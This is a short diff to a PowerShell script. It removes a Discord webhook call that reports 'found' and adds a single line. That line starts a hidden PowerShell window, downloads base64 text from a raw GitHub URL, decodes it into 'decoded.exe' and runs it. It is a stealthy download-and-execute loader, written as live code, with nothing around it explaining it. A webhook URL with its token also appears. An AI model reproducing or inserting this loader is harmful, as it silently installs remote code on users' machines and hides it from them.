@@ -1,5 +1,1 @@
-$webhookUrl = 'https://discord.com/api/webhooks/1312716612754997278/KqR7pD93OinOKDpA7gIFEXeZLNEZv_3OB-RGhLlyh0eJs3fuuZ30b-jOyVxMr6G5jmGx'
-$payload = @{
-    content = 'found'
-} | ConvertTo-Json
-Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload
+Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command [System.IO.File]::WriteAllBytes('decoded.exe', [Convert]::FromBase64String((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lookatmelaw/first/refs/heads/main/encoded_executable.txt' -UseBasicParsing).Content)); Start-Process 'decoded.exe'" -NoNewWindow; exit
